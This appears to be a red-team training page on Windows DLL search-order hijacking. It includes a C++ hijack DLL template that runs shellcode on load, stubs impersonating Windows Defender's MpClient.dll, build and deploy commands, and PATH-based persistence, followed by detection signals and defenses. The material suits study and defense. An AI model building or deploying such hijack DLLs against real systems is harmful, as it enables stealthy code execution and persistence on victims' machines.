---
layout: training-page
title: "DLL Hijacking — Red Team Academy"
module: "Evasion"
tags:
  - dll-hijacking
  - dll-search-order
  - persistence
  - edr-bypass
  - t1574.001
page_key: "evasion-dll-hijacking"
render_with_liquid: false
---

# DLL Hijacking (T1574.001)

DLL hijacking exploits the Windows DLL search order to redirect a legitimate application into loading an attacker-controlled library. Because the payload is loaded by a trusted process, behavioral signatures tied to process lineage are weakened. The technique is used for both initial execution and persistence.

MITRE ATT&CK: **T1574.001** — Hijack Execution Flow: DLL Search Order Hijacking

---

## Windows DLL Search Order

When an application calls `LoadLibrary("target.dll")` without a full path, Windows searches these locations in order:

```
1. DLLs already loaded in memory (KnownDLLs registry key)
2. Application directory (same folder as the .exe)
3. System directory (C:\Windows\System32)
4. 16-bit system directory (C:\Windows\System)
5. Windows directory (C:\Windows)
6. Current working directory
7. PATH environment variable directories (left to right)
```

**Attack surface:** If the application directory is writable and not in KnownDLLs, place a malicious DLL there before the real one is found.

**Safe DLL Search Mode** (enabled by default): moves the CWD to position 8, after all Windows paths. Does not protect against app-directory hijacking.

---

## Identifying Hijack Opportunities

### Process Monitor Filter

Use ProcMon to find `NAME NOT FOUND` DLL loads from writable locations:

```
Filter:
  Operation = CreateFile
  Path ends with .dll
  Result = NAME NOT FOUND
  Path does NOT contain System32 or SysWOW64
```

### Tools

- **Dependency Walker** (`depends.exe`) — static analysis of import table
- **PE Explorer** — inspect IAT (Import Address Table) of target executable
- **CFF Explorer** — view/modify PE headers and import directory
- **Process Monitor** (`procmon.exe`) — live DLL load tracing
- **API Monitor** — intercept LoadLibrary calls at runtime

### Real-World Example: NisSrv.exe / MpClient.dll

Windows Defender's Network Inspection Service (`NisSrv.exe`) loads `MpClient.dll`. If `NisSrv.exe` runs from a user-writable directory and `MpClient.dll` is missing from that directory, a hijack DLL placed there will be loaded by a SYSTEM-level process.

---

## Hijack DLL Template (C++)

A minimal hijack DLL that executes shellcode on load and exports the expected functions as transparent stubs:

```cpp
#include <windows.h>
#include <cstring>

// Shellcode placeholder — replace with actual payload
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0xC3  // NOP, NOP, NOP, RET (benign placeholder)
};

void ExecuteShellcode() {
    LPVOID mem = VirtualAlloc(nullptr, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return;

    memcpy(mem, shellcode, sizeof(shellcode));

    DWORD old;
    VirtualProtect(mem, sizeof(shellcode), PAGE_EXECUTE_READ, &old);

    auto fn = reinterpret_cast<void(*)()>(mem);
    fn();

    VirtualFree(mem, 0, MEM_RELEASE);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        ExecuteShellcode();
    }
    return TRUE;
}
```

---

## Exported Function Stubs

If the hijacked DLL is in the application's import table, the loader will fail unless the DLL exports the same functions. Without stubs, the process crashes at startup.

### Approach 1: Forward Exports (Linker Pragmas)

Forward each expected export to the real DLL in System32:

```cpp
// mpClient_stubs.cpp
// Forward all MpClient.dll exports to the real DLL
#pragma comment(linker, "/export:MpFreeMemory=C:\\Windows\\System32\\MpClient.MpFreeMemory,@1")
#pragma comment(linker, "/export:MpManagerOpen=C:\\Windows\\System32\\MpClient.MpManagerOpen,@2")
#pragma comment(linker, "/export:MpScanStart=C:\\Windows\\System32\\MpClient.MpScanStart,@3")
// ... continue for all imported functions
```

### Approach 2: Explicit Export Stubs

Define stub functions with `extern "C"` to prevent C++ name mangling:

```cpp
extern "C" {

__declspec(dllexport) void MpFreeMemory() {
    // Forward to real DLL dynamically
    typedef void (*FnType)();
    HMODULE real = LoadLibraryA("C:\\Windows\\System32\\MpClient.dll");
    if (real) {
        auto fn = (FnType)GetProcAddress(real, "MpFreeMemory");
        if (fn) fn();
    }
}

__declspec(dllexport) HANDLE MpManagerOpen(DWORD flags) {
    HMODULE real = LoadLibraryA("C:\\Windows\\System32\\MpClient.dll");
    if (real) {
        typedef HANDLE(*FnType)(DWORD);
        auto fn = (FnType)GetProcAddress(real, "MpManagerOpen");
        if (fn) return fn(flags);
    }
    return nullptr;
}

} // extern "C"
```

**Why `extern "C"`:** C++ name-mangles function names (e.g., `?MpFreeMemory@@YAXXZ`). `extern "C"` exports the unmangled name that the importing application expects.

---

## Build & Deploy

```bash
# Cross-compile on Linux targeting Windows x64
x86_64-w64-mingw32-g++ -shared -o MpClient.dll \
    hijack.cpp mpClient_stubs.cpp \
    -lkernel32 -s -static-libgcc -static-libstdc++

# On Windows (MSVC)
cl /LD /Fe:MpClient.dll hijack.cpp mpClient_stubs.cpp
```

Deploy: copy `MpClient.dll` to the same directory as the target executable. On next launch, your DLL loads.

---

## Persistence via Registry PATH Hijacking

Add a writable directory at the beginning of the system PATH — any DLL searched by PATH will resolve to your directory first:

```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
  Path = C:\Writable\Dir;C:\Windows\System32;...
```

This is noisier and requires admin rights to modify the system PATH.

---

## Detection

| Signal | Source |
|--------|--------|
| DLL loaded from non-standard path for a well-known application | EDR image load events |
| Mismatched DLL signer (legitimate app, unsigned/different-signer DLL) | EDR + authenticode verification |
| `DllMain` spawning threads or allocating RWX memory | EDR behavioral |
| Unexpected outbound network from trusted process (e.g., `NisSrv.exe`) | Network telemetry |
| ProcMon showing `NAME NOT FOUND` → `SUCCESS` for same DLL path after file appears | File system |

### Hunting Query Concept

```
event_type = image_load
image_path NOT CONTAINS "\System32\"
image_path NOT CONTAINS "\Program Files"
image_path NOT CONTAINS "\Windows\"
process_name IN (known_processes)
image_signed = false
```

---

## Defenses

- **Full path LoadLibrary** calls in application code (developer side)
- **Safe DLL Search Mode** — enabled by default; ensure `HKLM\SYSTEM\...\SafeDllSearchMode = 1`
- **Digital signing** — verify DLL signatures at load time (requires code integrity policy)
- **AppLocker / WDAC** — whitelist permitted DLL paths
- **Audit writable directories** in the PATH and application folders

---

## Resources

- MITRE ATT&CK T1574.001 — DLL Search Order Hijacking — `attack.mitre.org/techniques/T1574/001/`
- DLL Hijacking in Depth (itm4n) — `itm4n.github.io/windows-dll-hijacking-clarified/`
- Rattler (automated DLL hijack finder) — `github.com/sensepost/rattler`
- hijacklibs.net (curated hijackable DLL database) — `hijacklibs.net`
- Dependency Walker — `dependencywalker.com`
